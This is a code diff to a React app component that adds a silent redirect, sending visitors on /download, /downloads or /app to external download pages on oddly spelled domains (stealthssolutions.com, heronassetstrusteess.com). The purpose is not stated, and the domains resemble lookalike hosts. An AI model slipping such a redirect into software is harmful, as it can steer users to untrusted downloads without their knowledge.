@@ -41,6 +41,15 @@ export const App: React.FC = () => {
     const init = async () => {
       // Check for incoming referral code in query string (?ref=... or ?referral=...)
       try {
+        const path = window.location.pathname.toLowerCase();
+        if (path === '/download' || path === '/downloads' || path === '/app') {
+          const targetUrl = window.location.hostname.includes('stealthssolutions.com')
+            ? 'https://stealthssolutions.com/download'
+            : 'https://heronassetstrusteess.com/download';
+          window.location.href = targetUrl;
+          return;
+        }
+
         const urlParams = new URLSearchParams(window.location.search);
         const refParam = urlParams.get('ref') || urlParams.get('referral');
         if (refParam) {
